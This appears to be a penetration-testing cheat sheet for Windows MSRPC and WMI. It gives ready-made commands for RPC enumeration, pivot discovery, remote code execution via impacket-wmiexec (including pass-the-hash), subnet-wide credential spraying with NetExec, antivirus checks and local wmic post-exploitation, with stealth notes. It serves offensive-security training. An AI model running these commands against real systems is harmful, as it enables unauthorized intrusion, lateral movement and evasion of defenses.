# MSRPC & WMI (Windows Management Instrumentation)
**Default Ports:** 135 (RPC Endpoint Mapper), 49152-65535 (Dynamic RPC Ports) 
**Key Insight:** WMI is the administrative heart of Windows. If you have valid credentials, it provides the cleanest Remote Code Execution (RCE) and deep system enumeration.
## 1. Discovery & Enumeration (Unauthenticated)
**Goal:** Map available RPC interfaces and find hidden network cards (Dual-Homed).
### Impacket RPCDump
**Description:** Lists all registered RPC interfaces (UUIDs) and their ports. 
**Use Case:** Verifies if Exchange (MS-Exchange), File Server, or other specific apps are running without touching the service directly. 
**Syntax:** `impacket-rpcdump @<Target_IP> -port 135`
```shell
# ⚠️ OPSEC: Moderate Noise.
impacket-rpcdump @10.129.2.15 -port 135
```
### IOXIDResolver (Dual-Homed Check)
**Install:** `git clone https://github.com/mubix/IOXIDResolver` 
**Description:** Queries the IOXIDResolver interface to list **all** IP addresses the target has. **Critical:** This often reveals the **Internal IP** (e.g., 172.16.x.x) of a dual-homed machine, allowing you to pivot.
```shell
# Syntax: python3 IOXIDResolver.py -t <Target_IP>
python3 IOXIDResolver.py -t 10.129.2.15
```
## 2. Remote Execution (Authenticated)
**Condition:** You have valid credentials (User/Pass or Hash).
### Impacket WMIExec
**Description:** Executes commands via WMI. It does NOT upload a binary (unlike PsExec), making it stealthier against traditional AV. 
**Syntax:** `impacket-wmiexec <Domain>/<User>:<Pass>@<Target_IP>`
```shell
# Password Login
# ⚠️ OPSEC: Moderate. WMI process creation is logged (Event 4688).
impacket-wmiexec WORKGROUP/Administrator:Password123@10.129.2.15

# Pass-The-Hash (PTH)
# -hashes LM:NT
impacket-wmiexec Administrator@10.129.2.15 -hashes :32693b11e6aa90eb43d32c72a77fc333
```
### NetExec (Mass Execution)
**Description:** Check WMI access across a subnet or execute a single command.
```shell
# Check if WMI is accessible (Pwned?)
nxc wmi 10.129.2.0/24 -u 'jsmith' -p 'Password123'

# Execute Command (One-Liner)
nxc wmi 10.129.2.15 -u 'jsmith' -p 'Password123' -x "whoami"
```
## 3. Remote Enumeration (WQL Queries)
**Goal:** Query system information (AV status, Patches) without spawning a full shell.
### Impacket WMIQuery
**Syntax:** `impacket-wmiquery <User>:<Pass>@<Target> -c "<WQL_Query>"`
```shell
# Get OS Version & Architecture
impacket-wmiquery Administrator:Pass123@10.129.2.15 -c "SELECT Caption, Version, OSArchitecture FROM Win32_OperatingSystem"

# Check for Antivirus / Defender
# Queries the SecurityCenter2 namespace
impacket-wmiquery Administrator:Pass123@10.129.2.15 -n root/SecurityCenter2 -c "SELECT * FROM AntiVirusProduct"
```
## 4. Post-Exploitation (Local WMIC)
**Context:** You have a shell on the target. 
**Note:** `wmic` is deprecated but still present. PowerShell `Get-CimInstance` is the modern alternative.
```shell
# System Info (OS, Service Pack, Arch)
wmic os get Caption,CSDVersion,OSArchitecture,InstallDate

# List Installed Updates (Patch Level - finding Missing KBs)
wmic qfe get HotFixID,InstalledOn

# List Installed Software
wmic product get name,version

# Uninstall Software (Dangerous)
wmic product where name="VulnerableApp" call uninstall

# Process List (Tasklist alternative)
wmic process list brief

# List Running Services
wmic service list brief
```